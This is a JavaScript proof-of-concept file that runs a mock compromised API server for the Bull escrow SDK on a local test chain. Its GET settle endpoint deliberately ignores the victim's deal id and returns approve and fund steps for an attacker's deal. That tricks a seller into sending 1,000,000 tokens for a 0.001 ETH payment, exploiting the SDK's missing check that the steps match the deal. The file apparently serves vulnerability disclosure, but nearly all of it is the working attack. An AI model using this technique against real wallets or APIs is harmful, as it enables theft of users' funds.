// Mock Bull API server for B-03 — plays the role of a COMPROMISED / MALICIOUS Bull API.
// It answers the two endpoints the real Bull SDK uses:
//   POST /api/v1/settle       -> signed fee quote + createDeal transaction (HONEST here:
//                               the ATTACKER uses the API normally to create their own deal)
//   GET  /api/v1/settle/:id   -> fund steps for a deal
// The TAMPER is in the GET: whatever deal the VICTIM (seller) asks about, the server
// returns the steps for the ATTACKER's deal instead — approve(escrow, 1,000,000) +
// fundTokens(attackerDealId). The victim believes they are delivering the 100 tokens
// they agreed to sell in their RFQ; the steps actually deliver 1,000,000 tokens into
// the attacker's deal (buyer=attacker, payAmount=0.001 ETH). The SDK's fund() never
// checks that the steps match the deal the user intends to fund: no dealId binding,
// no sellAmount/sellToken/buyer check, and no cap at all for token amounts.
// The fee quote is signed with the REAL feeSigner key (the PoC deploys the escrow with
// a feeSigner it controls), so the on-chain quote check passes exactly as it would
// against the real Bull backend. No real Bull infrastructure; local Anvil + REAL
// BullEscrow source (verified on Sourcify, chain 4663).
import http from "node:http";
import {
  encodeAbiParameters, encodeFunctionData, keccak256, parseAbi,
  parseEther, parseUnits,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";

const ZERO = "0x0000000000000000000000000000000000000000";
const ESCROW_ABI = parseAbi([
  "function createDeal((address seller,address sellerPayout,address buyerReceive,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline) p, (uint16 feeBps,uint64 expiry,bytes sig) q) returns (uint256 id)",
  "function fundTokens(uint256 id)",
  "function approve(address spender, uint256 amount) returns (bool)",
]);
const DEAL_PARAMS_TYPE = {
  type: "tuple",
  components: [
    { name: "seller", type: "address" },
    { name: "sellerPayout", type: "address" },
    { name: "buyerReceive", type: "address" },
    { name: "sellToken", type: "address" },
    { name: "sellAmount", type: "uint256" },
    { name: "payToken", type: "address" },
    { name: "payAmount", type: "uint256" },
    { name: "deadline", type: "uint64" },
  ],
};

export function startMockApi({ port, escrow, feeSignerKey, attackerDeal }) {
  const feeSigner = privateKeyToAccount(feeSignerKey);
  const server = http.createServer((req, res) => {
    const send = (obj) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(obj));
    };
    if (req.method === "POST" && req.url === "/api/v1/settle") {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", async () => {
        const b = JSON.parse(body || "{}");
        const now = Math.floor(Date.now() / 1000);
        const params = {
          seller: b.seller,
          sellerPayout: b.sellerPayout || b.seller,
          buyerReceive: b.buyerReceive || b.buyer,
          sellToken: b.sellToken,
          sellAmount: parseUnits(String(b.sellAmount), 18),
          payToken: ZERO,
          payAmount: parseEther(String(b.payAmount)),
          deadline: BigInt(now + (Number(b.deadlineHours) || 24) * 3600),
        };
        const feeBps = 250;
        const expiry = BigInt(now + 3600);
        const ph = keccak256(encodeAbiParameters([DEAL_PARAMS_TYPE], [params]));
        const h = keccak256(encodeAbiParameters(
          [{ type: "uint256" }, { type: "address" }, { type: "address" }, { type: "bytes32" }, { type: "uint16" }, { type: "uint64" }],
          [31337n, escrow, b.buyer, ph, feeBps, expiry],
        ));
        const sig = await feeSigner.signMessage({ message: { raw: h } });
        const data = encodeFunctionData({
          abi: ESCROW_ABI, functionName: "createDeal",
          args: [params, { feeBps, expiry, sig }],
        });
        console.log("[mock-api] POST /api/v1/settle — createDeal for buyer", b.buyer, "seller", b.seller, "sellAmount", b.sellAmount, "payAmount", b.payAmount);
        send({ transaction: { to: escrow, data, value: "0" } });
      });
      return;
    }
    if (req.method === "GET" && req.url.startsWith("/api/v1/settle/")) {
      // MALICIOUS: ignore the requested deal id; always return the steps for
      // the ATTACKER's deal. The victim asked for their own deal's steps.
      const { id, seller, sellAmount, token } = attackerDeal;
      const approveData = encodeFunctionData({
        abi: ESCROW_ABI, functionName: "approve", args: [escrow, sellAmount],
      });
      const fundData = encodeFunctionData({
        abi: ESCROW_ABI, functionName: "fundTokens", args: [id],
      });
      console.log("[mock-api] GET", req.url, "— MALICIOUS response: returning steps for ATTACKER deal", id.toString(), "(sellAmount", sellAmount.toString() + ")");
      send({
        buyerSteps: [],
        sellerSteps: [
          // approve() is called ON the token contract (to=token), spender=escrow.
          { from: seller, transaction: { to: token, data: approveData, value: "0" } },
          { from: seller, transaction: { to: escrow, data: fundData, value: "0" } },
        ],
      });
      return;
    }
    res.writeHead(404, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "not found" }));
  });
  return new Promise((resolve) => server.listen(port, "127.0.0.1", () => resolve(server)));
}
